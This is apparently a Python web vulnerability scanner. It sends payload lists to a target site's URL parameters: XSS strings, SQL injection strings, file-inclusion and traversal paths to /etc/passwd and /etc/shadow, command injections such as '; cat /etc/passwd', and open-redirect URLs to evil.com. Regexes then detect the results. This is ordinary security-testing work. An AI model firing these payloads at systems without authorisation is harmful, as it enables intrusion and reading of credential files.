import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import setup_logger, log_scan_result, log_error
from utils.helpers import validate_url, save_results, get_timestamp

class VulnerabilityScanner:
    def __init__(self, target_url, threads=10, timeout=10):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.threads = threads
        self.timeout = timeout
        self.logger = setup_logger("vulnerability_scanner")
        
        # Results storage
        self.vulnerabilities = []
        self.security_headers = {}
        self.ssl_info = {}
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Vulnerability patterns and payloads
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            "'><img src=x onerror=alert('XSS')>",
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>'
        ]
        
        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "1 OR 1=1",
            "1 OR 1=1 --",
            "1 OR 1=1#",
            "1 OR 1=1/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
        
        self.lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../etc/shadow',
            '../../../etc/group',
            '../../../etc/hosts',
            '../../../proc/version',
            '../../../proc/cmdline',
            '..\\..\\..\\boot.ini',
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\windows\\system.ini',
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts',
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts'
        ]
        
        self.command_injection_payloads = [
            '; ls',
            '| ls',
            '& dir',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; whoami',
            '| whoami',
            '& whoami',
            '; id',
            '| id',
            '& id',
            '; uname -a',
            '| uname -a',
            '& ver',
            '`ls`',
            '$(ls)',
            '${ls}',
            '; sleep 5',
            '| sleep 5',
            '& timeout 5'
        ]
    
    def check_security_headers(self, url):
        """Check for security headers"""
        self.logger.info(f"Checking security headers for {url}")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            headers = response.headers
            
            security_headers_check = {
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'X-XSS-Protection': headers.get('X-XSS-Protection'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-Permitted-Cross-Domain-Policies': headers.get('X-Permitted-Cross-Domain-Policies'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Feature-Policy': headers.get('Feature-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy')
            }
            
            # Analyze missing or weak headers
            missing_headers = []
            weak_headers = []
            
            if not security_headers_check['X-Frame-Options']:
                missing_headers.append('X-Frame-Options')
                self.add_vulnerability('Missing Security Header', 'Medium', 
                                     f'X-Frame-Options header is missing from {url}',
                                     'Add X-Frame-Options header to prevent clickjacking attacks')
            
            if not security_headers_check['X-XSS-Protection']:
                missing_headers.append('X-XSS-Protection')
                self.add_vulnerability('Missing Security Header', 'Low', 
                                     f'X-XSS-Protection header is missing from {url}',
                                     'Add X-XSS-Protection: 1; mode=block header')
            
            if not security_headers_check['X-Content-Type-Options']:
                missing_headers.append('X-Content-Type-Options')
                self.add_vulnerability('Missing Security Header', 'Low', 
                                     f'X-Content-Type-Options header is missing from {url}',
                                     'Add X-Content-Type-Options: nosniff header')
            
            if not security_headers_check['Strict-Transport-Security'] and url.startswith('https'):
                missing_headers.append('Strict-Transport-Security')
                self.add_vulnerability('Missing Security Header', 'Medium', 
                                     f'HSTS header is missing from {url}',
                                     'Add Strict-Transport-Security header for HTTPS sites')
            
            if not security_headers_check['Content-Security-Policy']:
                missing_headers.append('Content-Security-Policy')
                self.add_vulnerability('Missing Security Header', 'Medium', 
                                     f'Content-Security-Policy header is missing from {url}',
                                     'Implement Content Security Policy to prevent XSS attacks')
            
            self.security_headers = {
                'url': url,
                'headers': security_headers_check,
                'missing_headers': missing_headers,
                'weak_headers': weak_headers,
                'timestamp': get_timestamp()
            }
            
            return self.security_headers
            
        except Exception as e:
            log_error(f"Error checking security headers for {url}", self.logger, e)
            return None
    
    def test_xss_vulnerability(self, url, parameters=None):
        """Test for XSS vulnerabilities"""
        self.logger.info(f"Testing XSS vulnerabilities for {url}")
        
        if not parameters:
            # Try to extract parameters from URL
            parsed = urlparse(url)
            if parsed.query:
                parameters = list(parse_qs(parsed.query).keys())
            else:
                return []
        
        xss_vulnerabilities = []
        
        for param in parameters:
            for payload in self.xss_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if payload in response.text and response.status_code == 200:
                        xss_vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'severity': 'High',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Payload reflected in response',
                            'timestamp': get_timestamp()
                        })
                        
                        self.add_vulnerability('Reflected XSS', 'High',
                                             f'XSS vulnerability found in parameter "{param}" at {url}',
                                             'Implement proper input validation and output encoding')
                        break  # Found XSS, no need to test more payloads for this param
                    
                except Exception as e:
                    self.logger.debug(f"Error testing XSS payload {payload}: {str(e)}")
                    continue
        
        return xss_vulnerabilities
    
    def test_sqli_vulnerability(self, url, parameters=None):
        """Test for SQL injection vulnerabilities"""
        self.logger.info(f"Testing SQL injection vulnerabilities for {url}")
        
        if not parameters:
            parsed = urlparse(url)
            if parsed.query:
                parameters = list(parse_qs(parsed.query).keys())
            else:
                return []
        
        sqli_vulnerabilities = []
        
        # SQL error patterns
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"Exception.*\WSystem\.Data\.SqlClient\.",
            r"Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"ODBC Microsoft Access",
            r"Syntax error.*query expression",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]"
        ]
        
        for param in parameters:
            for payload in self.sqli_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for SQL error messages
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            sqli_vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'SQL error detected in response',
                                'timestamp': get_timestamp()
                            })
                            
                            self.add_vulnerability('SQL Injection', 'High',
                                                 f'SQL injection vulnerability found in parameter "{param}" at {url}',
                                                 'Use parameterized queries and input validation')
                            break
                    
                except Exception as e:
                    self.logger.debug(f"Error testing SQLi payload {payload}: {str(e)}")
                    continue
        
        return sqli_vulnerabilities
    
    def test_lfi_vulnerability(self, url, parameters=None):
        """Test for Local File Inclusion vulnerabilities"""
        self.logger.info(f"Testing LFI vulnerabilities for {url}")
        
        if not parameters:
            parsed = urlparse(url)
            if parsed.query:
                parameters = list(parse_qs(parsed.query).keys())
            else:
                return []
        
        lfi_vulnerabilities = []
        
        # LFI detection patterns
        lfi_patterns = [
            r"root:.*:0:0:",
            r"\[boot loader\]",
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
            r"\[files\]",
            r"\[Mail\]",
            r"daemon:.*:1:1:",
            r"mysql:.*:.*:",
            r"www-data:.*:.*:",
            r"nobody:.*:.*:",
            r"Linux version \d",
            r"Darwin Kernel Version",
            r"Microsoft Windows"
        ]
        
        for param in parameters:
            for payload in self.lfi_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for LFI indicators
                    for pattern in lfi_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            lfi_vulnerabilities.append({
                                'type': 'Local File Inclusion',
                                'severity': 'High',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'File content detected in response',
                                'timestamp': get_timestamp()
                            })
                            
                            self.add_vulnerability('Local File Inclusion', 'High',
                                                 f'LFI vulnerability found in parameter "{param}" at {url}',
                                                 'Implement proper input validation and file access controls')
                            break
                    
                except Exception as e:
                    self.logger.debug(f"Error testing LFI payload {payload}: {str(e)}")
                    continue
        
        return lfi_vulnerabilities
    
    def test_command_injection(self, url, parameters=None):
        """Test for command injection vulnerabilities"""
        self.logger.info(f"Testing command injection vulnerabilities for {url}")
        
        if not parameters:
            parsed = urlparse(url)
            if parsed.query:
                parameters = list(parse_qs(parsed.query).keys())
            else:
                return []
        
        command_injection_vulnerabilities = []
        
        # Command injection detection patterns
        command_patterns = [
            r"uid=\d+.*gid=\d+",
            r"root:.*:0:0:",
            r"bin:.*:1:1:",
            r"daemon:.*:2:2:",
            r"Microsoft Windows \[Version",
            r"Volume in drive \w+ is",
            r"Directory of \w+:",
            r"Linux.*\d+\.\d+\.\d+",
            r"Darwin.*\d+\.\d+\.\d+",
            r"total \d+",
            r"drwx.*root.*root",
            r"-rw-.*root.*root"
        ]
        
        for param in parameters:
            for payload in self.command_injection_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for command execution indicators
                    for pattern in command_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            command_injection_vulnerabilities.append({
                                'type': 'Command Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Command output detected in response',
                                'timestamp': get_timestamp()
                            })
                            
                            self.add_vulnerability('Command Injection', 'Critical',
                                                 f'Command injection vulnerability found in parameter "{param}" at {url}',
                                                 'Implement strict input validation and avoid system calls')
                            break
                    
                except Exception as e:
                    self.logger.debug(f"Error testing command injection payload {payload}: {str(e)}")
                    continue
        
        return command_injection_vulnerabilities
    
    def check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        self.logger.info(f"Checking directory traversal for {url}")
        
        traversal_payloads = [
            '../',
            '..\\',
            '..../',
            '....\\',
            '../../../',
            '..\\..\\..\\',
            '....//....//..../',
            '....\\\\....\\\\....\\\\',
            '%2e%2e%2f',
            '%2e%2e%5c',
            '..%2f',
            '..%5c',
            '%252e%252e%252f',
            '%252e%252e%255c'
        ]
        
        vulnerabilities = []
        
        for payload in traversal_payloads:
            try:
                test_url = f"{url}{payload}etc/passwd"
                response = self.session.get(test_url, timeout=self.timeout)
                
                if re.search(r"root:.*:0:0:", response.text):
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'severity': 'High',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'Successfully accessed /etc/passwd',
                        'timestamp': get_timestamp()
                    })
                    
                    self.add_vulnerability('Directory Traversal', 'High',
                                         f'Directory traversal vulnerability found at {url}',
                                         'Implement proper input validation and file access controls')
                    break
                
            except Exception as e:
                self.logger.debug(f"Error testing directory traversal payload {payload}: {str(e)}")
                continue
        
        return vulnerabilities
    
    def check_open_redirect(self, url, parameters=None):
        """Check for open redirect vulnerabilities"""
        self.logger.info(f"Checking open redirect for {url}")
        
        if not parameters:
            parsed = urlparse(url)
            if parsed.query:
                parameters = list(parse_qs(parsed.query).keys())
            else:
                return []
        
        redirect_payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            '\\\\evil.com',
            'http://google.com',
            'https://google.com',
            '//google.com',
            'javascript:alert("redirect")',
            'data:text/html,<script>alert("redirect")</script>'
        ]
        
        vulnerabilities = []
        
        for param in parameters:
            for payload in redirect_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if payload in location or 'evil.com' in location or 'google.com' in location:
                            vulnerabilities.append({
                                'type': 'Open Redirect',
                                'severity': 'Medium',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Redirects to: {location}',
                                'timestamp': get_timestamp()
                            })
                            
                            self.add_vulnerability('Open Redirect', 'Medium',
                                                 f'Open redirect vulnerability found in parameter "{param}" at {url}',
                                                 'Validate redirect URLs against a whitelist')
                            break
                    
                except Exception as e:
                    self.logger.debug(f"Error testing open redirect payload {payload}: {str(e)}")
                    continue
        
        return vulnerabilities
    
    def add_vulnerability(self, vuln_type, severity, description, recommendation):
        """Add vulnerability to results"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'recommendation': recommendation,
            'timestamp': get_timestamp()
        }
        self.vulnerabilities.append(vulnerability)
    
    def comprehensive_scan(self, endpoints=None, parameters=None):
        """Run comprehensive vulnerability scan"""
        self.logger.info(f"Starting comprehensive vulnerability scan for {self.target_url}")
        
        start_time = time.time()
        
        # Check security headers
        self.check_security_headers(self.target_url)
        
        # If no endpoints provided, use base URL
        if not endpoints:
            endpoints = [self.target_url]
        
        # Run vulnerability tests
        for endpoint in endpoints:
            full_url = urljoin(self.target_url, endpoint) if not endpoint.startswith('http') else endpoint
            
            try:
                # Test various vulnerabilities
                self.test_xss_vulnerability(full_url, parameters)
                self.test_sqli_vulnerability(full_url, parameters)
                self.test_lfi_vulnerability(full_url, parameters)
                self.test_command_injection(full_url, parameters)
                self.check_directory_traversal(full_url)
                self.check_open_redirect(full_url, parameters)
                
            except Exception as e:
                log_error(f"Error scanning endpoint {full_url}", self.logger, e)
                continue
        
        end_time = time.time()
        scan_duration = end_time - start_time
        
        results = {
            'target_url': self.target_url,
            'scan_type': 'vulnerability_scan',
            'timestamp': get_timestamp(),
            'scan_duration': scan_duration,
            'vulnerabilities': self.vulnerabilities,
            'security_headers': self.security_headers,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'Low']),
                'endpoints_tested': len(endpoints) if endpoints else 1
            }
        }
        
        self.logger.info(f"Vulnerability scan completed in {scan_duration:.2f} seconds")
        self.logger.info(f"Found {len(self.vulnerabilities)} vulnerabilities")
        
        return results
    
    def save_results(self, results, format_type='json'):
        """Save vulnerability scan results"""
        if not results:
            return None
        
        parsed_url = urlparse(self.target_url)
        domain_clean = parsed_url.netloc.replace('.', '_')
        filename = f"vulnerability_scan_{domain_clean}"
        
        filepath = save_results(results, filename, format_type)
        self.logger.info(f"Vulnerability scan results saved to: {filepath}")
        return filepath

def run_vulnerability_scan(target_url, endpoints=None, parameters=None, save_format='json'):
    """Main function to run vulnerability scanning"""
    
    # Validate URL
    if not validate_url(target_url):
        print(f"Error: Invalid URL '{target_url}'. Please provide a valid URL.")
        return None
    
    # Initialize scanner
    scanner = VulnerabilityScanner(target_url)
    
    try:
        # Run comprehensive scan
        results = scanner.comprehensive_scan(endpoints, parameters)
        
        # Save results
        if results and save_format:
            scanner.save_results(results, save_format)
        
        return results
        
    except KeyboardInterrupt:
        scanner.logger.info("Vulnerability scan interrupted by user")
        return None
    except Exception as e:
        log_error("Unexpected error during vulnerability scan", scanner.logger, e)
        return None

if __name__ == "__main__":
    # Example usage
    target_url = "http://testphp.vulnweb.com"
    results = run_vulnerability_scan(target_url)
    
    if results:
        print(f"\nVulnerability Scan Results for {target_url}:")
        print(f"Total vulnerabilities: {results['summary']['total_vulnerabilities']}")
        print(f"Critical: {results['summary']['critical']}")
        print(f"High: {results['summary']['high']}")
        print(f"Medium: {results['summary']['medium']}")
        print(f"Low: {results['summary']['low']}")
        
        if results['vulnerabilities']:
            print("\nFound vulnerabilities:")
            for vuln in results['vulnerabilities'][:5]:
                print(f"  [{vuln['severity']}] {vuln['type']}: {vuln['description']}")
